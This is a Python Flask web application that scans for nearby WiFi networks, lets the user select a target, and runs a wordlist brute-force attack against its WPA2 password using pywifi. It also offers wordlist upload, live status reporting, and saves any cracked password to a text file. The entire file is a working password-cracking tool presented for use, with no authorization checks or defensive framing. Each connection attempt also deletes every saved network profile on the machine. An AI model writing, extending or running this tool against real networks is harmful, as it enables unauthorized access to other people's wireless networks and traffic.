from flask import Flask, render_template, request, jsonify, redirect, url_for
import pywifi
from pywifi import const
import time
import os
import threading
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['ALLOWED_EXTENSIONS'] = {'txt'}

# Global variables for WiFi bruteforce
selected_ssid = None
selected_bssid = None
selected_signal = None
wordlist_path = "wordlist.txt"
password_found = False
found_password = None
attack_in_progress = False
current_status = "Ready"
attempted_passwords = []
verification_attempts = 2  # Number of verification attempts
attempt_delay = 1  # Seconds between attempts

# Ensure upload folder exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def scan_for_networks():
    """ Scan for available WiFi networks and return a list """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    time.sleep(4)  # Wait for scanning

    networks = iface.scan_results()
    wifi_list = []

    for network in networks:
        ssid = network.ssid if network.ssid else "Hidden_Network"
        signal = network.signal
        wifi_list.append({
            'ssid': ssid,
            'bssid': network.bssid,
            'signal': signal
        })

    return wifi_list

def connect_to_wifi(password):
    """ Attempt to connect to the selected WiFi network with given password """
    global selected_ssid, selected_bssid
    
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        # Create a new profile
        profile = pywifi.Profile()
        profile.ssid = selected_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        # Remove all saved profiles
        iface.remove_all_network_profiles()

        # Add new profile
        temp_profile = iface.add_network_profile(profile)

        # Connect to network
        iface.connect(temp_profile)

        # Wait for connection result
        time.sleep(4)
        
        if iface.status() == const.IFACE_CONNECTED:
            # Save password to file
            with open(f"WiFi_{selected_ssid}_Password.txt", "w") as f:
                f.write(f"Network: {selected_ssid}\nBSSID: {selected_bssid}\nPassword: {password}")
            return True
        
        return False
    except Exception as e:
        current_status = f"Connection error: {str(e)}"
        return False

def brute_force_attack(wordlist_path):
    """ Perform brute-force attack with verification """
    global selected_ssid, selected_bssid, password_found, found_password, \
           attack_in_progress, current_status, attempted_passwords, \
           verification_attempts, attempt_delay
    
    attack_in_progress = True
    password_found = False
    found_password = None
    attempted_passwords = []
    current_status = "Starting attack..."
    
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wordlist:
            total_passwords = sum(1 for _ in wordlist)
            wordlist.seek(0)
            
            for i, password in enumerate(wordlist):
                if not attack_in_progress:
                    break
                    
                password = password.strip()
                if not password:
                    continue
                    
                attempted_passwords.append(password)
                progress = (i / total_passwords) * 100
                current_status = f"Trying password: {password} ({(i+1)}/{total_passwords}, {progress:.1f}%)"
                
                # Initial attempt
                if connect_to_wifi(password):
                    # Verification phase (2/3 successful attempts required)
                    success_count = 1
                    current_status = f"Potential match! Verifying: {password} (1/{verification_attempts})"
                    
                    for attempt in range(verification_attempts - 1):
                        time.sleep(attempt_delay)  # Delay between attempts
                        if connect_to_wifi(password):
                            success_count += 1
                            current_status = f"Verification {attempt+2}/{verification_attempts} succeeded for: {password}"
                        else:
                            current_status = f"Verification {attempt+2}/{verification_attempts} failed for: {password}"
                            break
                    
                    if success_count >= verification_attempts:
                        password_found = True
                        found_password = password
                        current_status = f"Successfully verified! Password: {password}"
                        break
                    else:
                        current_status = f"Verification failed for: {password}. Continuing..."
    except Exception as e:
        current_status = f"Error: {str(e)}"
    finally:
        attack_in_progress = False
        if not password_found:
            current_status = "Attack completed - No password found"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan():
    networks = scan_for_networks()
    return jsonify(networks)

@app.route('/select', methods=['POST'])
def select():
    global selected_ssid, selected_bssid, selected_signal
    data = request.json
    selected_ssid = data['ssid']
    selected_bssid = data['bssid']
    selected_signal = data['signal']
    return jsonify({'status': 'success'})

@app.route('/upload', methods=['POST'])
def upload():
    global wordlist_path
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
        
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        wordlist_path = filepath
        return jsonify({'status': 'success', 'path': wordlist_path})
        
    return jsonify({'error': 'Invalid file type'}), 400

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global attack_in_progress
    
    if attack_in_progress:
        return jsonify({'error': 'Attack already in progress'}), 400
        
    if not selected_ssid:
        return jsonify({'error': 'No target selected'}), 400
        
    if not os.path.exists(wordlist_path):
        return jsonify({'error': 'Wordlist not found'}), 400
        
    # Start attack in a background thread
    thread = threading.Thread(target=brute_force_attack, args=(wordlist_path,))
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_in_progress
    attack_in_progress = False
    return jsonify({'status': 'stopped'})

@app.route('/status', methods=['GET'])
def status():
    global password_found, found_password, current_status, attempted_passwords, selected_ssid, selected_bssid, selected_signal
    
    return jsonify({
        'status': current_status,
        'in_progress': attack_in_progress,
        'password_found': password_found,
        'found_password': found_password,
        'attempted_count': len(attempted_passwords),
        'selected_ssid': selected_ssid,
        'selected_bssid': selected_bssid,
        'selected_signal': selected_signal
    })

if __name__ == '__main__':
    app.run(debug=True)